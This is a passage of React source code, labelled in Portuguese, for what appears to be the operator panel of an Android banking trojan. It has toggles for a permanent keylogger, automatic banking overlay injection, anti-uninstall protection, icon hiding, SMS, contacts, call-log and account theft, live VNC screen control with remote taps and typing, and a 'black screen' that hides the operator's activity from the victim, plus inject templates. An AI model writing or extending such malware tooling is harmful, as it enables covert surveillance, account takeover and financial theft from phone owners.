                <div className="flex items-center justify-between border-b border-[#14233e] pb-3">
                  <h3 className="text-xs font-black uppercase text-slate-200 tracking-wider font-mono">
                    STATUS DAS PERMISSÃ•ES
                  </h3>
                  <button
                    onClick={() => {
                      sendCommand({ action: 'CHECK_PERMISSIONS' });
                      showToast('Sincronizando permissÃµes com o dispositivo...', 'info');
                    }}
                    className="text-[11px] font-bold text-red-400 hover:text-pink-300 uppercase tracking-wider font-mono flex items-center gap-1"
                  >
                    <RefreshCw className="w-3 h-3" />
                    ATUALIZAR LISTA
                  </button>
                </div>

                <div className="space-y-2">
                  {[
                    { key: 'accessibility', title: 'ServiÃ§os de Acessibilidade' },
                    { key: 'storage', title: 'Acesso a Arquivos e Armazenamento' },
                    { key: 'camera', title: 'PermissÃ£o de CÃ¢mera' },
                    { key: 'contacts', title: 'Ler Contatos' },
                    { key: 'call_log', title: 'Ler Registro de Chamadas' },
                    { key: 'accounts', title: 'Obter Contas Google / Emails' },
                    { key: 'microphone', title: 'PermissÃ£o de Microfone' },
                    { key: 'location', title: 'PermissÃ£o de LocalizaÃ§Ã£o GPS' },
                    { key: 'phone', title: 'Fazer Chamadas TelefÃ´nicas' },
                    { key: 'sms', title: 'Enviar e Ler SMS' },
                    { key: 'wallpaper', title: 'Definir Papel de Parede' },
                    { key: 'battery_optimization', title: 'OtimizaÃ§Ã£o de Bateria' },
                    { key: 'overlay', title: 'SobreposiÃ§Ã£o de Tela (Overlay)' },
                    { key: 'notifications', title: 'Captura de NotificaÃ§Ãµes' }
                  ].map((perm) => {
                    const isGranted = !!permissions[perm.key];
                    return (
                      <div
                        key={perm.key}
                        className="bg-[#091224] border border-[#14233e] hover:border-[#1d3257] rounded-xl p-3 flex items-center justify-between transition-all"
                      >
                        <div className="flex items-center gap-3">
                          <span
                            className={`w-2 h-2 rounded-full flex-shrink-0 ${
                              isGranted
                                ? 'bg-rose-400 shadow-[0_0_8px_rgba(52,211,153,0.8)]'
                                : 'bg-red-500 shadow-[0_0_8px_rgba(239,68,68,0.5)]'
                            }`}
                          />
                          <div>
                            <div className="font-bold text-xs text-slate-100 font-sans">{perm.title}</div>
                            <div
                              className={`text-[10px] font-mono font-bold tracking-wider ${
                                isGranted ? 'text-emerald-400' : 'text-red-400'
                              }`}
                            >
                              {isGranted ? 'CONCEDIDA / ATIVA' : 'NEGADA / DESATIVADA'}
                            </div>
                          </div>
                        </div>

                        <button
                          onClick={() => togglePermission(perm.key)}
                          className={`w-11 h-6 flex items-center rounded-full p-1 transition-all ${
                            isGranted ? 'bg-[#0070f3] justify-end' : 'bg-[#15233e] justify-start'
                          }`}
                        >
                          <div className="w-4 h-4 rounded-full bg-white shadow-md" />
                        </button>
                      </div>
                    );
                  })}
                </div>
              </div>
            )}

            {generalSubTab === 'bot_options' && (
              <div className="bg-[#081020] border border-[#14233e] rounded-2xl p-5 shadow-lg space-y-4">
                <div className="flex items-center justify-between border-b border-[#14233e] pb-3">
                  <h3 className="text-xs font-black uppercase text-slate-200 tracking-wider font-mono">
                    OPÃ‡Ã•ES DO BOT
                  </h3>
                  <button
                    onClick={() => {
                      sendCommand({ action: 'SYNC_BOT_SETTINGS' });
                      showToast('OpÃ§Ãµes sincronizadas com o dispositivo!', 'success');
                    }}
                    className="text-[11px] font-bold text-red-400 hover:text-pink-300 uppercase tracking-wider font-mono flex items-center gap-1"
                  >
                    <RefreshCw className="w-3 h-3" />
                    SINCRONIZAR
                  </button>
                </div>

                <div className="space-y-2">
                  {[
                    { key: 'live_screen', title: 'Tela ao Vivo', icon: Tv },
                    { key: 'permanent_keylogger', title: 'Keylogger Permanente', icon: Keyboard },
                    { key: 'notifications_log', title: 'Registro de NotificaÃ§Ãµes', icon: MessageSquare },
                    { key: 'activities_log', title: 'Registro de Atividades', icon: Activity },
                    { key: 'visited_apps', title: 'Aplicativos Visitados', icon: Smartphone },
                    { key: 'visited_links', title: 'Links Visitados', icon: ExternalLink },
                    { key: 'live_notifications', title: 'NotificaÃ§Ãµes em Tempo Real', icon: MessageSquare },
                    { key: 'auto_injection', title: 'Auto InjeÃ§Ã£o BancÃ¡ria', icon: Sparkles },
                    { key: 'anti_delete', title: 'ProteÃ§Ã£o Anti-ExclusÃ£o', icon: ShieldCheck },
                    { key: 'hide_icon', title: 'Ocultar Ãcone do App', icon: EyeOff }
                  ].map((opt) => {
                    const isEnabled = !!botOptions[opt.key];
                    const Icon = opt.icon;
                    return (
                      <div
                        key={opt.key}
                        className="bg-[#091224] border border-[#14233e] hover:border-[#1d3257] rounded-xl p-3 flex items-center justify-between transition-all"
                      >
                        <div className="flex items-center gap-3">
                          <div className="w-8 h-8 rounded-lg bg-[#0e1c36] border border-[#192f58] flex items-center justify-center text-red-400">
                            <Icon className="w-4 h-4" />
                          </div>
                          <div>
                            <div className="font-bold text-xs text-slate-100 font-sans">{opt.title}</div>
                            <div
                              className={`text-[10px] font-mono font-bold tracking-wider ${
                                isEnabled ? 'text-red-400' : 'text-slate-500'
                              }`}
                            >
                              {isEnabled ? 'ATIVADO / EXECUTANDO' : 'DESATIVADO / DESLIGADO'}
                            </div>
                          </div>
                        </div>

                        <button
                          onClick={() => toggleBotOption(opt.key)}
                          className={`w-11 h-6 flex items-center rounded-full p-1 transition-all ${
                            isEnabled ? 'bg-[#0070f3] justify-end' : 'bg-[#15233e] justify-start'
                          }`}
                        >
                          <div className="w-4 h-4 rounded-full bg-white shadow-md" />
                        </button>
                      </div>
                    );
                  })}
                </div>
              </div>
            )}

            {generalSubTab === 'activities' && (
              <div className="bg-[#081020] border border-[#14233e] rounded-2xl p-5 shadow-lg space-y-4">
                <div className="flex items-center justify-between border-b border-[#14233e] pb-3">
                  <h3 className="text-xs font-black uppercase text-slate-200 tracking-wider font-mono">
                    REGISTRO DE ATIVIDADES DO DISPOSITIVO
                  </h3>
                  <button
                    onClick={fetchLogs}
                    className="text-[11px] font-bold text-red-400 hover:text-pink-300 uppercase tracking-wider font-mono flex items-center gap-1"
                  >
                    <RefreshCw className={`w-3 h-3 ${isLoadingLogs ? 'animate-spin' : ''}`} />
                    ATUALIZAR LOGS
                  </button>
                </div>

                <div className="space-y-2 font-mono text-xs max-h-[500px] overflow-y-auto pr-1">
                  {logs.length === 0 ? (
                    <div className="text-center py-10 text-slate-500">
                      Nenhuma atividade registrada ainda. Clique em "Atualizar Logs" para buscar eventos recentes.
                    </div>
                  ) : (
                    logs.map((log: any, idx: number) => (
                      <div
                        key={log.id || idx}
                        className="bg-[#091224] border border-[#14233e] rounded-xl p-3 flex items-center justify-between"
                      >
                        <div className="flex items-center gap-3">
                          <span className="text-[10px] text-slate-400">{log.timestamp || 'Hoje'}</span>
                          <span className="font-bold text-pink-300">{log.action || log.event || 'COMANDO'}</span>
                          <span className="text-[11px] text-slate-300 truncate max-w-md">{log.details || log.message || ''}</span>
                        </div>
                        <span className="px-2 py-0.5 rounded bg-rose-950/80 border border-emerald-500/40 text-emerald-400 text-[10px] font-bold">
                          {log.status || 'OK'}
                        </span>
                      </div>
                    ))
                  )}
                </div>
              </div>
            )}
          </div>
        )}

        {/* ----------------------------------------------------------------- */}
        {/* 2. VISÃƒO: TELA AO VIVO + TELA V2 + NOTIFICAÃ‡Ã•ES LATERAIS          */}
        {/* ----------------------------------------------------------------- */}
        {activeTab === 'live_screen' && (
          <div className="w-full flex flex-wrap items-center justify-center gap-3.5 sm:gap-4 my-auto py-2">
            {/* --- TELA 1: VNC STREAMING --- */}
            {(screenViewMode === 'vnc' || screenViewMode === 'dual') && (
              <div className="w-full max-w-[350px] sm:max-w-[360px] bg-[#060c18] border border-[#14233e] rounded-[32px] sm:rounded-[38px] p-2.5 sm:p-3 shadow-2xl flex flex-col items-center relative flex-shrink-0">
                {/* Phone Header Bar */}
                <div className="w-full flex items-center justify-between px-2 pb-2 mb-1.5 border-b border-[#14233e]">
                    <div className="flex items-center gap-2 min-w-0">
                      <div className="min-w-0">
                        <div className="font-black text-[10px] uppercase text-white tracking-wider font-mono truncate">
                          {deviceName || 'MOTO G(10)'}
                        </div>
                        <div className="flex items-center gap-2 mt-0.5 whitespace-nowrap">
                          <span className="text-[9px] font-black text-emerald-400 font-mono">
                            {isCharging ? 'âš¡' : 'ðŸ”‹'} {batteryLevel}%
                          </span>
                        </div>
                      </div>
                    </div>

                    <div className="flex items-center gap-1.5 font-mono">
                      {/* CONTROLE DE QUALIDADE VNC - BARRA PROGRESSIVA AZUL */}
                      <div className="flex items-center gap-1.5 px-2 py-1 bg-[#091326] border border-red-500/40 rounded-xl shadow-inner">
                        <Sparkles className="w-3 h-3 text-red-400 shrink-0" />
                        <span className="text-[9px] font-bold text-pink-300 whitespace-nowrap">{vncQuality}%</span>
                        <input
                          type="range"
                          min={10}
                          max={100}
                          step={5}
                          value={vncQuality}
                          onChange={(e) => changeVncQuality(Number(e.target.value))}
                          className="w-12 sm:w-16 accent-red-400 cursor-pointer h-1.5 bg-[#040914] rounded-lg border border-[#162744]"
                          title="Arraste para ajustar a qualidade da imagem VNC"
                        />
                      </div>

                      {screenViewMode === 'vnc' && (
                        <div className="flex bg-[#0a1426] border border-[#162744] rounded-lg p-0.5 text-[9px] font-bold">
                          <button
                            onClick={() => setScreenViewMode('vnc')}
                            className="px-1.5 py-0.5 rounded bg-[#0070f3] text-white font-black"
                          >
                            VNC
                          </button>
                          <button
                            onClick={() => {
                              setScreenViewMode('v2');
                              setSidePanelTab('v2_elements');
                            }}
                            className="px-1.5 py-0.5 rounded text-slate-400 hover:text-white"
                          >
                            V2
                          </button>
                          <button
                            onClick={() => setScreenViewMode('dual')}
                            className="px-1.5 py-0.5 rounded text-slate-400 hover:text-white"
                          >
                            DUPLO
                          </button>
                        </div>
                      )}
                      <button
                        onClick={() => setStreamPaused(!streamPaused)}
                        className="p-1 rounded bg-[#0c1830] border border-[#1d3257] text-red-400 hover:text-white"
                        title={streamPaused ? 'Continuar TransmissÃ£o' : 'Pausar TransmissÃ£o'}
                      >
                        {streamPaused ? <Play className="w-3 h-3 text-emerald-400" /> : <Pause className="w-3 h-3 text-red-400" />}
                      </button>
                    </div>
                  </div>

                  {/* VNC Canvas Viewport */}
                  <div className="w-full max-w-[330px] h-[520px] sm:h-[600px] bg-black rounded-[20px] sm:rounded-[24px] overflow-hidden border border-[#162744] relative shadow-inner flex items-center justify-center">
                    {deviceId ? (
                      <DeviceScreen
                        deviceId={deviceId}
                        onCommand={sendCommand}
                        isBlackScreenActive={isBlackScreen}
                      />
                    ) : (
                      <div className="text-slate-500 font-mono text-xs text-center p-4">
                        Nenhum dispositivo conectado.
                      </div>
                    )}
                  </div>

                  {/* Virtual Android Navigation Bar */}
                  <div className="w-full flex items-center justify-around pt-2 mt-1 border-t border-[#14233e]">
                    <button
                      onClick={() => sendCommand({ action: 'RECENTS' })}
                      className="p-1.5 rounded-xl hover:bg-[#0e1c36] text-slate-400 hover:text-red-400"
                      title="Aplicativos Recentes"
                    >
                      <Layers className="w-4 h-4" />
                    </button>
                    <button
                      onClick={() => sendCommand({ action: 'HOME' })}
                      className="p-1.5 rounded-xl hover:bg-[#0e1c36] text-slate-400 hover:text-red-400"
                      title="InÃ­cio"
                    >
                      <div className="w-3.5 h-3.5 rounded-md border-2 border-slate-400 hover:border-red-400" />
                    </button>
                    <button
                      onClick={() => sendCommand({ action: 'BACK' })}
                      className="p-1.5 rounded-xl hover:bg-[#0e1c36] text-slate-400 hover:text-red-400"
                      title="Voltar"
                    >
                      <ArrowLeft className="w-4 h-4" />
                    </button>
                  </div>

                  {/* ðŸ“ BARRA RÃPIDA: DIGITAR / ENVIAR TEXTO DEBAIXO DO VNC */}
                  <form
                    onSubmit={async (e) => {
                      e.preventDefault();
                      if (!vncQuickText.trim()) return;
                      const toType = vncQuickText.trim();
                      setVncQuickText('');
                      await sendCommand({ action: 'TYPE', text: toType });
                      await sendCommand({ action: 'TYPE_TEXT', text: toType });
                      showToast(`ðŸ“ Texto "${toType}" enviado para o aparelho!`, 'success');
                    }}
                    className="w-full mt-2 pt-2 border-t border-[#14233e] flex items-center gap-1.5 font-mono"
                  >
                    <input
                      type="text"
                      value={vncQuickText}
                      onChange={(e) => setVncQuickText(e.target.value)}
                      placeholder="Enviar texto ao celular..."
                      className="flex-1 bg-[#030919] border border-[#162e58] focus:border-red-400 focus:ring-1 focus:ring-red-400/50 text-red-100 placeholder:text-slate-500 text-xs rounded-xl px-3 py-1.5 outline-none transition-all"
                    />
                    <button
                      type="submit"
                      disabled={!vncQuickText.trim()}
                      className="px-3 py-1.5 bg-gradient-to-r from-red-600 to-red-600 hover:from-red-500 hover:to-red-500 disabled:opacity-40 disabled:pointer-events-none text-white rounded-xl shadow-[0_0_12px_rgba(6,182,212,0.3)] transition-all shrink-0 flex items-center justify-center gap-1 text-[11px] font-black uppercase tracking-wider"
                      title="Enviar texto para o campo ativo do aparelho"
                    >
                      <Send className="w-3.5 h-3.5" />
                      <span>Enviar</span>
                    </button>
                  </form>
                </div>
              )}

              {/* --- TELA 2: TELA V2 LEITOR OCR INTERATIVO E EDITÃVEL --- */}
              {(screenViewMode === 'v2' || screenViewMode === 'dual') && (
                <div className="w-[350px] sm:w-[360px] bg-[#060c18] border border-[#14233e] rounded-[38px] p-3 shadow-2xl flex flex-col items-center relative transition-all flex-shrink-0">
                  {/* Phone Header Bar */}
                  <div className="w-full flex items-center justify-between px-2 pb-2 mb-1.5 border-b border-[#14233e]">
                    <div className="flex items-center gap-2">
                      <div className="w-1 h-5 bg-[#0070f3] rounded-full shadow-[0_0_8px_rgba(0,112,243,0.8)]" />
                      <div>
                        <div className="font-black text-[10px] uppercase text-white tracking-wider font-mono flex items-center gap-1">
                          EDITAR V2 <Edit3 className="w-3 h-3 text-red-400" />
                        </div>
                        <div className="flex items-center gap-2 mt-0.5">
                          <span className="text-[9px] font-black text-red-400 font-mono">LEITOR OCR</span>
                          <span className="text-[9px] font-black text-emerald-400 font-mono">
                            {isCharging ? 'âš¡' : 'ðŸ”‹'} {batteryLevel}%
                          </span>
                        </div>
                      </div>
                    </div>

                    <div className="flex items-center gap-1.5 font-mono">
                      {/* BOTÃƒO PARA ABRIR/FECHAR A ABA DE EDITAR V2 */}
                      <button
                        onClick={() => setShowV2EditorPanel((prev) => !prev)}
                        className={`px-2 py-1 rounded-lg border text-[9px] font-black tracking-wider uppercase transition-all flex items-center gap-1 ${
                          showV2EditorPanel
                            ? 'bg-[#0070f3] text-white border-red-400 font-black shadow-[0_0_10px_rgba(0,112,243,0.6)]'
                            : 'bg-[#0c1830] border-[#1d3257] text-red-400 hover:text-white'
                        }`}
                        title="Abrir / Fechar Painel de EdiÃ§Ã£o V2"
                      >
                        <Sliders className="w-3 h-3" />
                        {showV2EditorPanel ? 'Ocultar EdiÃ§Ã£o' : 'Editar V2'}
                      </button>

                      {screenViewMode === 'v2' && (
                        <div className="flex bg-[#0a1426] border border-[#162744] rounded-lg p-0.5 text-[9px] font-bold">
                          <button
                            onClick={() => setScreenViewMode('vnc')}
                            className="px-1.5 py-0.5 rounded text-slate-400 hover:text-white"
                          >
                            VNC
                          </button>
                          <button
                            onClick={() => {
                              setScreenViewMode('v2');
                              setSidePanelTab('v2_elements');
                            }}
                            className="px-1.5 py-0.5 rounded bg-[#0070f3] text-white font-black"
                          >
                            V2
                          </button>
                          <button
                            onClick={() => setScreenViewMode('dual')}
                            className="px-1.5 py-0.5 rounded text-slate-400 hover:text-white"
                          >
                            DUPLO
                          </button>
                        </div>
                      )}

                      <button
                        onClick={() => {
                          sendCommand({ action: 'REQUEST_HIERARCHY' });
                          showToast('Leitura de tela OCR atualizada!', 'info');
                        }}
                        className="p-1 rounded bg-[#0c1830] border border-[#1d3257] text-red-400 hover:text-white"
                        title="ForÃ§ar AtualizaÃ§Ã£o OCR"
                      >
                        <RefreshCw className="w-3 h-3" />
                      </button>
                    </div>
                  </div>

                  {/* Screen V2 Canvas Viewport */}
                  <div className="w-[330px] h-[600px] bg-black rounded-[32px] overflow-hidden border border-[#162744] relative shadow-inner flex items-center justify-center">
                    {/* Notch / Punch Hole da CÃ¢mera do Celular V2 */}
                    <div className="absolute top-2.5 left-1/2 -translate-x-1/2 w-24 h-4 bg-black rounded-full z-30 border border-[#162744] flex items-center justify-center gap-2 shadow-inner pointer-events-none">
                      <div className="w-2.5 h-2.5 rounded-full bg-slate-900 border border-slate-700"></div>
                      <div className="w-1.5 h-1.5 rounded-full bg-slate-800"></div>
                    </div>
                    {screenHierarchy && screenHierarchy.hierarchy ? (
                      <ScreenReaderCanvas
                        hierarchy={screenHierarchy.hierarchy}
                        onNodeClick={(x, y, normX, normY) => {
                          if (typeof normX === 'number' && typeof normY === 'number') {
                            sendCommand({
                              action: 'CLICK',
                              x: normX,
                              y: normY,
                              scale: 'vnc_norm'
                            });
                          }
                          sendCommand({ action: 'TAP', x, y });
                          showToast(`Clique enviado!`, 'success');
                          // Disparo ultra-rÃ¡pido instantÃ¢neo (80ms e 250ms) para atualizaÃ§Ã£o "na hora"
                          setTimeout(() => sendCommand({ action: 'REQUEST_HIERARCHY' }), 80);
                          setTimeout(() => fetchHierarchy(), 150);
                          setTimeout(() => sendCommand({ action: 'REQUEST_HIERARCHY' }), 300);
                          setTimeout(() => fetchHierarchy(), 400);
                        }}
                        onSwipe={(_x1, _y1, _x2, _y2, normX1, normY1, normX2, normY2, duration) => {
                          sendCommand({
                            action: 'SWIPE',
                            x1: normX1,
                            y1: normY1,
                            x2: normX2,
                            y2: normY2,
                            duration: Math.max(100, duration),
                            scale: 'vnc_norm'
                          });
                          showToast(`Gesto de arrastar enviado!`, 'success');
                          // Disparo ultra-rÃ¡pido instantÃ¢neo (80ms e 250ms) para atualizaÃ§Ã£o "na hora"
                          setTimeout(() => sendCommand({ action: 'REQUEST_HIERARCHY' }), 80);
                          setTimeout(() => fetchHierarchy(), 150);
                          setTimeout(() => sendCommand({ action: 'REQUEST_HIERARCHY' }), 300);
                          setTimeout(() => fetchHierarchy(), 450);
                        }}
                        onNodeSelect={(node) => {
                          setV2SelectedNode(node);
                        }}
                        v2Mode={v2Mode}
                        v2SearchQuery={v2SearchQuery}
                        v2Customizations={v2Customizations}
                        selectedNodeKey={v2SelectedNode ? getNodeKey(v2SelectedNode) : null}
                        hoveredNodeKey={v2HoveredNodeKey}
                        onNodeHover={(key) => setV2HoveredNodeKey(key)}
                        v2Theme={v2Theme}
                        v2GlobalTextScale={v2GlobalTextScale}
                        v2GlobalOpacity={v2GlobalOpacity}
                        v2GlobalBorderStyle={v2GlobalBorderStyle}
                        v2GlobalBlockColor={v2GlobalBlockColor}
                        v2GlobalTextColor={v2GlobalTextColor}
                      />
                    ) : (
                      <div className="text-center space-y-2 p-4">
                        <Grid className="w-8 h-8 text-red-400/50 mx-auto animate-pulse" />
                        <div className="text-[11px] font-bold text-pink-300 font-mono">Aguardando Telemetria V2...</div>
                        <button
                          onClick={() => sendCommand({ action: 'REQUEST_HIERARCHY' })}
                          className="px-3 py-1 bg-[#0070f3] text-white rounded-lg text-[10px] font-mono font-bold uppercase"
                        >
                          Ler Tela Agora
                        </button>
                      </div>
                    )}
                  </div>

                  {/* Virtual Android Navigation Bar */}
                  <div className="w-full flex items-center justify-around pt-2 mt-1 border-t border-[#14233e]">
                    <button
                      onClick={() => sendCommand({ action: 'RECENTS' })}
                      className="p-1.5 rounded-xl hover:bg-[#0e1c36] text-slate-400 hover:text-red-400"
                    >
                      <Layers className="w-4 h-4" />
                    </button>
                    <button
                      onClick={() => sendCommand({ action: 'HOME' })}
                      className="p-1.5 rounded-xl hover:bg-[#0e1c36] text-slate-400 hover:text-red-400"
                    >
                      <div className="w-3.5 h-3.5 rounded-md border-2 border-slate-400 hover:border-red-400" />
                    </button>
                    <button
                      onClick={() => sendCommand({ action: 'BACK' })}
                      className="p-1.5 rounded-xl hover:bg-[#0e1c36] text-slate-400 hover:text-red-400"
                    >
                      <ArrowLeft className="w-4 h-4" />
                    </button>
                  </div>

                  {/* ðŸ“ BARRA RÃPIDA: DIGITAR / ENVIAR TEXTO DEBAIXO DO V2 */}
                  <form
                    onSubmit={async (e) => {
                      e.preventDefault();
                      if (!vncQuickText.trim()) return;
                      const toType = vncQuickText.trim();
                      setVncQuickText('');
                      await sendCommand({ action: 'TYPE', text: toType });
                      await sendCommand({ action: 'TYPE_TEXT', text: toType });
                      showToast(`ðŸ“ Texto "${toType}" enviado para o aparelho!`, 'success');
                    }}
                    className="w-full mt-2 pt-2 border-t border-[#14233e] flex items-center gap-1.5 font-mono"
                  >
                    <input
                      type="text"
                      value={vncQuickText}
                      onChange={(e) => setVncQuickText(e.target.value)}
                      placeholder="Enviar texto ao celular..."
                      className="flex-1 bg-[#030919] border border-[#162e58] focus:border-red-400 focus:ring-1 focus:ring-red-400/50 text-red-100 placeholder:text-slate-500 text-xs rounded-xl px-3 py-1.5 outline-none transition-all"
                    />
                    <button
                      type="submit"
                      disabled={!vncQuickText.trim()}
                      className="px-3 py-1.5 bg-gradient-to-r from-red-600 to-red-600 hover:from-red-500 hover:to-red-500 disabled:opacity-40 disabled:pointer-events-none text-white rounded-xl shadow-[0_0_12px_rgba(6,182,212,0.3)] transition-all shrink-0 flex items-center justify-center gap-1 text-[11px] font-black uppercase tracking-wider"
                      title="Enviar texto para o campo ativo do aparelho"
                    >
                      <Send className="w-3.5 h-3.5" />
                      <span>Enviar</span>
                    </button>
                  </form>
                </div>
              )}

              {/* PAINEL LATERAL DE EDIÃ‡ÃƒO V2 (DUPLO MODO: TELA V2 GERAL E BLOCO SELECIONADO - APENAS QUANDO V2 ESTÃ ABERTO E USUÃRIO CLICOU EM EDITAR V2) */}
              {(screenViewMode === 'v2' || screenViewMode === 'dual') && showV2EditorPanel && (
                <div className="w-[280px] bg-[#061020]/95 border-2 border-red-500/60 rounded-[28px] p-3 shadow-[0_0_35px_rgba(59,130,246,0.3)] font-mono space-y-2.5 relative animate-in slide-in-from-left duration-150 flex-shrink-0">
                  {/* Header Selector Tabs */}
                  <div className="flex items-center justify-between border-b border-[#122442] pb-2">
                    <div className="flex bg-[#030914] p-0.5 rounded-xl border border-[#122442] w-full text-[9px] font-bold">
                      <button
                        onClick={() => setV2EditorMode('global')}
                        className={`flex-1 py-1 rounded-lg uppercase transition-all flex items-center justify-center gap-1 ${
                          v2EditorMode === 'global'
                            ? 'bg-red-500 text-black font-black shadow-[0_0_10px_rgba(59,130,246,0.5)]'
                            : 'text-slate-400 hover:text-pink-300'
                        }`}
                      >
                        ðŸŒ Tela V2 Geral
                      </button>
                      <button
                        onClick={() => setV2EditorMode('single')}
                        className={`flex-1 py-1 rounded-lg uppercase transition-all flex items-center justify-center gap-1 ${
                          v2EditorMode === 'single'
                            ? 'bg-red-500 text-black font-black shadow-[0_0_10px_rgba(59,130,246,0.5)]'
                            : 'text-slate-400 hover:text-pink-300'
                        }`}
                      >
                        âœï¸ Bloco ({v2SelectedNode ? 'Ativo' : 'Selecione'})
                      </button>
                    </div>
                  </div>

                {/* --- MODO 1: EDITAR TELA V2 GERAL (TODA A TELA V2 DE UMA VEZ) --- */}
                {v2EditorMode === 'global' && (
                  <div className="space-y-2.5">
                    {/* Tamanho Geral dos Textos da V2 */}
                    <div className="bg-[#030914] p-2 rounded-xl border border-[#122442] space-y-1">
                      <div className="flex justify-between text-[9px] font-bold text-slate-300">
                        <span>ðŸ”¤ Tam. Textos V2 (Geral):</span>
                        <span className="text-emerald-400 font-black">{(v2GlobalTextScale * 100).toFixed(0)}%</span>
                      </div>
                      <input
                        type="range"
                        min="0.5"
                        max="2.5"
                        step="0.1"
                        value={v2GlobalTextScale}
                        onChange={(e) => setV2GlobalTextScale(Number(e.target.value))}
                        className="w-full accent-emerald-400 cursor-pointer h-1.5"
                      />
                    </div>

                    {/* Brilho Fundo Geral da V2 */}
                    <div className="bg-[#030914] p-2 rounded-xl border border-[#122442] space-y-1">
                      <div className="flex justify-between text-[9px] font-bold text-slate-300">
                        <span>â˜€ï¸ Brilho Fundo V2 (Geral):</span>
                        <span className="text-emerald-400 font-black">{v2GlobalOpacity}%</span>
                      </div>
                      <input
                        type="range"
                        min="10"
                        max="100"
                        step="5"
                        value={v2GlobalOpacity}
                        onChange={(e) => setV2GlobalOpacity(Number(e.target.value))}
                        className="w-full accent-emerald-400 cursor-pointer h-1.5"
                      />
                    </div>

                    {/* Formato da Borda Geral V2 */}
                    <div className="space-y-1">
                      <label className="text-[9px] font-bold text-emerald-400 uppercase tracking-wider block">
                        Formato Bordas V2 (Geral):
                      </label>
                      <div className="flex items-center gap-1.5">
                        <button
                          type="button"
                          onClick={() => setV2GlobalBorderStyle('square')}
                          className={`flex-1 py-1 rounded-lg text-[10px] font-bold border transition-all flex items-center justify-center gap-1 ${
                            v2GlobalBorderStyle === 'square'
                              ? 'bg-rose-500 text-black border-emerald-300 font-black shadow-[0_0_10px_rgba(16,185,129,0.5)]'
                              : 'bg-[#081326] text-slate-300 border-[#14284b] hover:text-white'
                          }`}
                        >
                          â¬› Borda Quadrada
                        </button>
                        <button
                          type="button"
                          onClick={() => setV2GlobalBorderStyle('rounded')}
                          className={`flex-1 py-1 rounded-lg text-[10px] font-bold border transition-all flex items-center justify-center gap-1 ${
                            v2GlobalBorderStyle === 'rounded'
                              ? 'bg-rose-500 text-black border-emerald-300 font-black shadow-[0_0_10px_rgba(16,185,129,0.5)]'
                              : 'bg-[#081326] text-slate-300 border-[#14284b] hover:text-white'
                          }`}
                        >
                          ðŸŸ¡ Arredondada
                        </button>
                      </div>
                    </div>

                    {/* Cor Geral dos Blocos V2 */}
                    <div className="space-y-1">
                      <label className="text-[9px] font-bold text-emerald-400 uppercase tracking-wider block">
                        Cor Geral dos Blocos V2:
                      </label>
                      <div className="flex items-center gap-1.5 justify-between">
                        {['', '#ff2e5d', '#ff4757', '#F59E0B', '#EF4444', '#8B5CF6', '#EC4899'].map((c) => (
                          <button
                            key={c || 'default'}
                            type="button"
                            onClick={() => setV2GlobalBlockColor(c)}
                            className={`w-5 h-5 rounded-full transition-all border flex items-center justify-center text-[8px] font-bold ${
                              v2GlobalBlockColor === c
                                ? 'scale-125 border-white shadow-[0_0_8px_white]'
                                : 'border-transparent opacity-80 hover:opacity-100'
                            }`}
                            style={{ backgroundColor: c || '#1E293B' }}
                          >
                            {!c && 'AUTO'}
                          </button>
                        ))}
                      </div>
                    </div>

                    {/* Cor Geral das Letras V2 */}
                    <div className="space-y-1">
                      <label className="text-[9px] font-bold text-emerald-400 uppercase tracking-wider block">
                        Cor Geral das Letras V2:
                      </label>
                      <div className="flex items-center gap-1.5 justify-between">
                        {['', '#FFFFFF', '#ff1e4d', '#00FF66', '#FFD700', '#FF007F', '#000000'].map((tc) => (
                          <button
                            key={tc || 'default'}
                            type="button"
                            onClick={() => setV2GlobalTextColor(tc)}
                            className={`w-5 h-5 rounded-full transition-all border flex items-center justify-center text-[8px] font-bold ${
                              v2GlobalTextColor === tc
                                ? 'scale-125 border-white shadow-[0_0_8px_white]'
                                : 'border-transparent opacity-80 hover:opacity-100'
                            }`}
                            style={{ backgroundColor: tc || '#475569' }}
                          >
                            {!tc && 'AUTO'}
                          </button>
                        ))}
                      </div>
                    </div>

                    {/* Injects & Tela Preta (Templates Prontos) */}
                    <div className="space-y-1 pt-1.5 border-t border-[#122442]">
                      <label className="text-[9px] font-bold text-red-400 uppercase tracking-wider block flex items-center justify-between">
                        <span>ðŸŽ­ Injects & Tela Preta:</span>
                        <span className="text-[8px] text-pink-300 font-normal">Templates Prontos</span>
                      </label>
                      <div className="flex items-center gap-1.5">
                        <button
                          type="button"
                          onClick={() => setShowBlackScreenChoiceModal(true)}
                          className={`flex-1 py-1 rounded-lg text-[9px] font-bold border transition-all flex items-center justify-center gap-1 ${
                            isBlackScreen
                              ? 'bg-red-500 text-black border-pink-300 font-black shadow-[0_0_10px_rgba(6,182,212,0.5)]'
                              : 'bg-[#081326] text-slate-300 border-[#14284b] hover:text-white'
                          }`}
                        >
                          {isBlackScreen ? 'ðŸ‘ï¸ Tela Preta ON' : 'ðŸ•¶ï¸ Ativar Tela Preta'}
                        </button>
                        <button
                          type="button"
                          onClick={() => {
                            setEditingTemplate(null);
                            setShowBlackScreenEditor(true);
                          }}
                          className="flex-1 py-1 rounded-lg text-[9px] font-bold bg-red-600/30 border border-red-500/60 text-pink-300 hover:text-white transition-all flex items-center justify-center gap-1 shadow-[0_0_10px_rgba(59,130,246,0.3)]"
                        >
                          ðŸŽ¨ Templates Injects
                        </button>
                      </div>
                    </div>

                    {/* BotÃ£o Reset Geral */}
                    <div className="pt-2 border-t border-[#122442] flex justify-end">
                      <button
                        onClick={() => {
                          setV2GlobalTextScale(1.0);
                          setV2GlobalOpacity(40);
                          setV2GlobalBorderStyle('rounded');
                          setV2GlobalBlockColor('');
                          setV2GlobalTextColor('');
                          setV2Customizations({});
                          showToast('Tela V2 restaurada para o padrÃ£o!', 'info');
                        }}
                        className="w-full py-1 rounded-lg bg-red-950/60 border border-red-500/40 text-red-400 hover:text-white text-[10px] font-bold flex items-center justify-center gap-1"
                      >
                        <Trash2 className="w-3.5 h-3.5" /> Resetar Toda a Tela V2
                      </button>
                    </div>
                  </div>
                )}

                {/* --- MODO 2: EDITAR BLOCO SELECIONADO --- */}
                {v2EditorMode === 'single' && (
                  <div className="space-y-2.5">
                    {v2SelectedNode ? (
                      <>
                        {/* Custom Text Label Input */}
                        <div className="space-y-1">
                          <label className="text-[9px] font-bold text-emerald-400 uppercase tracking-wider block">
                            RÃ³tulo / Texto do Bloco:
                          </label>
                          <input
                            type="text"
                            value={v2EditLabel}
                            onChange={(e) => {
                              const val = e.target.value;
                              setV2EditLabel(val);
                              if (v2SelectedNode) {
                                const key = getNodeKey(v2SelectedNode);
